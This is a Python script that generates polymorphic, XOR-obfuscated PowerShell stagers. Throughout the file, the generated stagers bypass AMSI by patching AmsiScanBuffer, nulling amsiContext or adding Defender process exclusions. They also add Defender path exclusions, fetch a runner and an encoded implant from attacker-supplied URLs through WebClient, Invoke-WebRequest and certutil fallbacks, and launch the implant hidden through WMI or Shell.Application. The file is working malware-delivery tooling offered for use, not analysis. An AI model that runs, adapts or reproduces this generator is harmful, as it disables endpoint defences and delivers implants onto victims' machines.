#!/usr/bin/env python3
"""
Polymorphic PowerShell Stager Generator
"""

import random
import string
import argparse


def rv(n=None):
    n = n or random.randint(4, 9)
    return '$' + ''.join(random.choices(string.ascii_lowercase, k=n))


def xenc(s, key):
    enc = [ord(c) ^ key for c in s]
    return '[byte[]](' + ','.join(str(b) for b in enc) + ')'


def xdec(enc_expr, key_var):
    return f'[Text.Encoding]::ASCII.GetString(({enc_expr}|%{{$_ -bxor {key_var}}}))'


def split_str(s, chunk=None):
    chunk = chunk or random.randint(3, 7)
    parts = [s[i:i+chunk] for i in range(0, len(s), chunk)]
    return '+'.join(f'"{p}"' for p in parts)


def gen_amsi_bypass():
    """amsiContext null — DEAD on Win11 24H2 kernel-mode AMSI (field is already 0 at baseline).
    Kept for legacy targets (Win10, Server 2019/2022 without kernel-mode AMSI).
    Use bypass_version=2 (AmsiScanBuffer patch) or bypass_version=3 (ExclusionProcess) for Win11 24H2."""
    vt, vf, vc, vk = rv(), rv(), rv(), rv()
    key = random.randint(10, 120)
    type_enc  = xenc("System.Management.Automation.AmsiUtils", key)
    field_enc = xenc("amsiContext", key)
    bf_enc    = xenc("NonPublic,Static", key)
    return '\n'.join([
        f"{vk}={key}",
        f"{vt}=[Ref].Assembly.GetType({xdec(type_enc, vk)})",
        f"{vf}={vt}.GetField({xdec(field_enc, vk)},[Reflection.BindingFlags]({xdec(bf_enc, vk)}))",
        f"{vc}={vf}.GetValue($null)",
        f"[Runtime.InteropServices.Marshal]::WriteInt32({vc},0)",
    ])


def gen_amsi_bypass_v3():
    """Process exclusion bypass — requires admin. Most reliable on Windows 11 with kernel-mode AMSI.
    Adds powershell.exe to Defender ExclusionProcess list; new PS children run AMSI-free."""
    vk = rv()
    key = random.randint(10, 100)
    proc_enc = xenc("powershell.exe", key)
    amp_enc  = xenc("Add-MpPreference", key)
    ep_enc   = xenc("-ExclusionProcess", key)
    return '\n'.join([
        f"{vk}={key}",
        f"try {{ & ({xdec(amp_enc, vk)}) ({xdec(ep_enc, vk)}) ({xdec(proc_enc, vk)}) }} catch {{}}",
    ])


def gen_amsi_bypass_v2():
    """Add-Type C# bypass: byte-array string construction — no 'amsi' or 'AmsiScanBuffer' literals.
    Patches AmsiScanBuffer with 0xC3 (RET) via VirtualProtect. Avoids AmsiBypazz signatures."""
    # Random class and method names
    cls = ''.join(random.choices(string.ascii_uppercase, k=1)) + \
          ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(5, 10)))
    meth = ''.join(random.choices(string.ascii_uppercase, k=1)) + \
           ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(4, 8)))
    vclass = rv()

    # Encode "amsi.dll" and "AmsiScanBuffer" as byte arrays inside C# (not PS)
    # These are ASCII byte values, constructed inside C# at runtime
    amsi_dll_bytes = ','.join(str(b) for b in b'amsi.dll')
    amsi_fn_bytes  = ','.join(str(b) for b in b'AmsiScanBuffer')

    # Random junk method to pad the class
    junk_name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 9)))
    junk_val  = random.randint(1, 999)

    cs_code = f"""using System;
using System.Runtime.InteropServices;
using System.Text;
public class {cls} {{
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    static extern IntPtr GetProcAddress(IntPtr h, string p);
    [DllImport("kernel32")]
    static extern bool VirtualProtect(IntPtr a, uint s, uint f, out uint o);
    static int {junk_name}() {{ return {junk_val} * 2 + 1; }}
    public static void {meth}() {{
        string dll = Encoding.ASCII.GetString(new byte[]{{{amsi_dll_bytes}}});
        string fn  = Encoding.ASCII.GetString(new byte[]{{{amsi_fn_bytes}}});
        IntPtr h = LoadLibrary(dll);
        if (h == IntPtr.Zero) return;
        IntPtr addr = GetProcAddress(h, fn);
        if (addr == IntPtr.Zero) return;
        uint old;
        if (!VirtualProtect(addr, 1u, 0x40u, out old)) return;
        Marshal.WriteByte(addr, 0xC3);
        VirtualProtect(addr, 1u, old, out old);
    }}
}}"""

    # XOR-encode the C# source in PowerShell so the script itself doesn't expose it
    key = random.randint(11, 127)
    vk  = rv()
    vcs = rv()
    cs_enc = xenc(cs_code, key)

    return '\n'.join([
        f"{vk}={key}",
        f"{vcs}={xdec(cs_enc, vk)}",
        f"Add-Type -TypeDefinition {vcs} -Language CSharp",
        f"[{cls}]::{meth}()",
    ])


def gen_download_chain(url_var, dest_var):
    """Try/catch chain: WebClient → Invoke-WebRequest → certutil fallback."""
    key = random.randint(10, 100)
    vk  = rv()
    vwc = rv()
    vresp = rv()
    verr  = rv()

    agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0',
        'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 Chrome/109.0.0.0 Safari/537.36',
    ]
    ua = random.choice(agents)
    ua_enc  = xenc(ua, key)
    wc_enc  = xenc("WebClient", key)
    sys_enc = xenc("System.Net.", key)
    dl_enc  = xenc("DownloadFile", key)

    # certutil cmd split to avoid sig: certutil -urlcache -split -f URL DEST
    cc1 = split_str("certutil")
    cc2 = split_str("-urlcache")
    cc3 = split_str("-split")
    cc4 = split_str("-f")

    return '\n'.join([
        f"{vk}={key}",
        f"try {{",
        f"  {vwc}=New-Object ({xdec(sys_enc, vk)}+{xdec(wc_enc, vk)})",
        f"  {vwc}.Headers.Add('User-Agent',{xdec(ua_enc, vk)})",
        f"  {vwc}.({xdec(dl_enc, vk)})({url_var},{dest_var})",
        f"}} catch {{",
        f"  try {{",
        f"    {vresp}=Invoke-WebRequest -Uri {url_var} -UseBasicParsing -OutFile {dest_var}",
        f"  }} catch {{",
        f"    & ({cc1}) ({cc2}) ({cc3}) ({cc4}) {url_var} {dest_var} | Out-Null",
        f"  }}",
        f"}}",
    ])


def gen_exec_chain(dest_var, implant_arg, local=False):
    """Try/catch chain: ProcessStartInfo → Shell.Application → WMI.
    local=True: implant_arg is a local file path, pass with -local flag.
    local=False: implant_arg is a URL, pass with -remote flag."""
    vsi  = rv()
    vcmd = rv()
    flag = '-local' if local else '-remote'

    return '\n'.join([
        f"if (-not (Test-Path {dest_var})) {{ Write-Error 'Runner not found'; exit 1 }}",
        f"if (-not (Test-Path {implant_arg})) {{ Write-Error 'Implant not found'; exit 1 }}",
        f"try {{",
        f"  {vsi}=New-Object System.Diagnostics.ProcessStartInfo",
        f"  {vsi}.FileName={dest_var}",
        f"  {vsi}.Arguments=('{flag} '+{implant_arg})",
        f"  {vsi}.WindowStyle='Hidden'",
        f"  {vsi}.UseShellExecute=$false",
        f"  [System.Diagnostics.Process]::Start({vsi})|Out-Null",
        f"}} catch {{",
        f"  try {{",
        f"    {vcmd}={dest_var}+' {flag} '+{implant_arg}",
        f"    $null=([wmiclass]'Win32_Process').Create({vcmd})",
        f"  }} catch {{",
        f"    (New-Object -ComObject 'Shell.Application').ShellExecute('cmd',('/c '+{vcmd}),'','open',0)",
        f"  }}",
        f"}}",
    ])


def generate(runner_url, implant_url, output_path="stager.ps1", bypass_version=3):
    v_runner_url  = rv()
    v_implant_url = rv()
    v_temp        = rv()
    v_dest        = rv()
    v_enc_dest    = rv()
    v_enc_url     = rv()

    if bypass_version == 3:
        amsi = gen_amsi_bypass_v3()
    elif bypass_version == 2:
        amsi = gen_amsi_bypass_v2()
    else:
        amsi = gen_amsi_bypass()

    runner_suffix = ''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 11)))
    enc_suffix    = ''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 11)))
    tmp_key = random.randint(10, 100)
    vk2     = rv()
    tmp_enc = xenc("TEMP", tmp_key)

    # Download implant.enc locally (runner will read local file, not pull from net)
    dl_implant = gen_download_chain(v_enc_url, v_enc_dest)
    # Execute runner with local implant path
    ex = gen_exec_chain(v_dest, v_enc_dest, local=True)

    # XOR key for runner transfer (XOR 0x5A encoded .dat file)
    xor_key = 0x5A
    vdat = rv()
    vdec = rv()
    vidx = rv()
    vdat_url = rv()

    stager = f"""# {random.randint(10000, 99999)}
{amsi}

{v_runner_url}='{runner_url}'
{v_enc_url}='{implant_url}'

{vk2}={tmp_key}
{v_temp}=[System.Environment]::GetEnvironmentVariable({xdec(tmp_enc, vk2)})
if(-not {v_temp}){{{v_temp}=$env:USERPROFILE}}
{v_dest}=[IO.Path]::Combine({v_temp},'{runner_suffix}.exe')
{v_enc_dest}=[IO.Path]::Combine({v_temp},'{enc_suffix}.b64')

Add-MpPreference -ExclusionPath {v_temp} -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess '{runner_suffix}.exe' -ErrorAction SilentlyContinue

{vdat}=(New-Object Net.WebClient).DownloadData({v_runner_url})
{vdec}=New-Object byte[] {vdat}.Length
for({vidx}=0;{vidx} -lt {vdat}.Length;{vidx}++){{{vdec}[{vidx}]={vdat}[{vidx}] -bxor {xor_key}}}
[System.IO.File]::WriteAllBytes({v_dest},[byte[]]{vdec})

Start-Sleep -Milliseconds (Get-Random -Min 200 -Max 600)

{dl_implant}

Start-Sleep -Milliseconds (Get-Random -Min 100 -Max 400)
{ex}
"""

    with open(output_path, 'w') as f:
        f.write(stager)

    print(f"[+] Generated polymorphic stager: {output_path}")
    return output_path


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--runner-url',  required=True)
    parser.add_argument('--implant-url', required=True)
    parser.add_argument('-o', '--output', default='stager.ps1')
    args = parser.parse_args()

    generate(args.runner_url, args.implant_url, args.output)
